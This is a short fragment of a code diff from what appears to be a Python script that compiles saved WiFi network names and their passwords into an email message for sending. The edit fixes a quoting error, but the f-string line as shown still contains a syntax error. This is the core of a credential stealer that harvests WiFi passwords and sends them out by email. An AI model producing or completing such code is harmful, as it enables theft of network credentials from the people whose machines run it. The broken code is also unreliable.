@@ -48,7 +48,7 @@ if len(profile_names) != 0:
 # Create the message for the email
 email_message = ""
 for item in wifi_list:
-    email_message += f "SSID: {item['ssid']}, Password: {item['password]}\n"
+    email_message += f "SSID: {item['ssid']}, Password: {item['password']}\n"
 
 # Create EmailMessage Object
 email = EmailMessage()
